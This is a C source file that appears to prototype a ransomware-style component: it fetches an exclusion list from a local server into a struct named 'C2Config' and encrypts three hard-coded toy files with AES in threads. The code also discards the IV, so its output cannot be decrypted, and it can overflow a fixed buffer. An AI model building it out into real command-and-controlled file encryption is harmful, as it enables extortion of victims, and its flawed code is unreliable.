#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/sha.h>
#include <curl/curl.h>

#define MAX_THREADS 4
#define MAX_FILENAME 256
#define EXCLUDE_LIST_SIZE 10

typedef struct {
    unsigned char key[EVP_MAX_KEY_LENGTH];
    unsigned char iv[EVP_MAX_IV_LENGTH];
    char algo[16];
} C2Config;

typedef struct {
    char *filenames[EXCLUDE_LIST_SIZE];
    int count;
} ExcludeList;

typedef struct {
    char *filename;
    C2Config *config;
} ThreadData;

ExcludeList excludeList = { .count = 0 };
C2Config c2Config;

void *encrypt_file(void *arg);
void fetch_exclude_list(ExcludeList *list);
int is_excluded(const char *filename, ExcludeList *list);
void derive_key_from_password(const char *password, unsigned char *key, unsigned char *iv);

size_t write_callback(void *ptr, size_t size, size_t nmemb, void *stream) {
    strcat((char *)stream, (char *)ptr);
    return size * nmemb;
}

void derive_key_from_password(const char *password, unsigned char *key, unsigned char *iv) {
    const unsigned char salt[] = "some_salt"; 
    const int iterations = 10000;
    const int key_length = EVP_MAX_KEY_LENGTH;
    const int iv_length = EVP_MAX_IV_LENGTH;

    if (!PKCS5_PBKDF2_HMAC_SHA1(password, strlen(password), salt, sizeof(salt), iterations, key_length, key)) {
        perror("PKCS5_PBKDF2_HMAC_SHA1 failed");
        exit(EXIT_FAILURE);
    }

    if (!RAND_bytes(iv, iv_length)) {
        perror("RAND_bytes for IV failed");
        exit(EXIT_FAILURE);
    }
}

void fetch_exclude_list(ExcludeList *list) {
    CURL *curl;
    CURLcode res;
    char buffer[1024] = {0};

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, "http://localhost:8000/exclude_list");
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, buffer);

        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        } else {
            char *token = strtok(buffer, "\n");
            while (token != NULL && list->count < EXCLUDE_LIST_SIZE) {
                list->filenames[list->count++] = strdup(token);
                token = strtok(NULL, "\n");
            }
        }

        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
}

int is_excluded(const char *filename, ExcludeList *list) {
    for (int i = 0; i < list->count; i++) {
        if (strcmp(filename, list->filenames[i]) == 0) {
            return 1;
        }
    }
    return 0;
}

void *encrypt_file(void *arg) {
    ThreadData *data = (ThreadData *)arg;
    char *filename = data->filename;
    C2Config *config = data->config;

    if (is_excluded(filename, &excludeList)) {
        printf("File %s is excluded from encryption\n", filename);
        return NULL;
    }

    FILE *infile = fopen(filename, "rb");
    if (!infile) {
        perror("Failed to open file for reading");
        return NULL;
    }

    char outfilename[MAX_FILENAME];
    snprintf(outfilename, sizeof(outfilename), "%s_encrypted", filename);

    FILE *outfile = fopen(outfilename, "wb");
    if (!outfile) {
        perror("Failed to open file for writing");
        fclose(infile);
        return NULL;
    }

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        perror("Failed to create EVP_CIPHER_CTX");
        fclose(infile);
        fclose(outfile);
        return NULL;
    }

    if (strcmp(config->algo, "AES") == 0) {
        if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_128_cfb(), NULL, config->key, config->iv)) {
            perror("EVP_EncryptInit_ex failed");
            EVP_CIPHER_CTX_free(ctx);
            fclose(infile);
            fclose(outfile);
            return NULL;
        }
    } else {
        fprintf(stderr, "Unsupported encryption algorithm: %s\n", config->algo);
        EVP_CIPHER_CTX_free(ctx);
        fclose(infile);
        fclose(outfile);
        return NULL;
    }

    unsigned char inbuf[EVP_MAX_BLOCK_LENGTH];
    unsigned char outbuf[EVP_MAX_BLOCK_LENGTH + EVP_MAX_BLOCK_LENGTH];
    int inlen, outlen;

    while ((inlen = fread(inbuf, 1, EVP_MAX_BLOCK_LENGTH, infile)) > 0) {
        if (1 != EVP_EncryptUpdate(ctx, outbuf, &outlen, inbuf, inlen)) {
            perror("EVP_EncryptUpdate failed");
            EVP_CIPHER_CTX_free(ctx);
            fclose(infile);
            fclose(outfile);
            return NULL;
        }
        fwrite(outbuf, 1, outlen, outfile);
    }

    if (1 != EVP_EncryptFinal_ex(ctx, outbuf, &outlen)) {
        perror("EVP_EncryptFinal_ex failed");
        EVP_CIPHER_CTX_free(ctx);
        fclose(infile);
        fclose(outfile);
        return NULL;
    }
    fwrite(outbuf, 1, outlen, outfile);

    EVP_CIPHER_CTX_free(ctx);
    fclose(infile);
    fclose(outfile);

    printf("File %s encrypted successfully\n", filename);
    return NULL;
}

int main() {
    char password[256];
    printf("Enter password for encryption: ");
    if (!fgets(password, sizeof(password), stdin)) {
        perror("Failed to read password");
        exit(EXIT_FAILURE);
    }
    password[strcspn(password, "\n")] = '\0';

    derive_key_from_password(password, c2Config.key, c2Config.iv);

    strncpy(c2Config.algo, "AES", sizeof(c2Config.algo));

    fetch_exclude_list(&excludeList);

    char *files_to_encrypt[] = { "buenas", "hey", "chao" };
    int num_files = sizeof(files_to_encrypt) / sizeof(files_to_encrypt[0]);

    pthread_t threads[MAX_THREADS];
    ThreadData threadData[MAX_THREADS];
    int thread_count = 0;

    for (int i = 0; i < num_files; i++) {
        threadData[thread_count].filename = files_to_encrypt[i];
        threadData[thread_count].config = &c2Config;
        pthread_create(&threads[thread_count], NULL, encrypt_file, &threadData[thread_count]);
        thread_count++;

        if (thread_count >= MAX_THREADS) {
            for (int j = 0; j < thread_count; j++) {
                pthread_join(threads[j], NULL);
            }
            thread_count = 0;
        }
    }

    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    return 0;
}
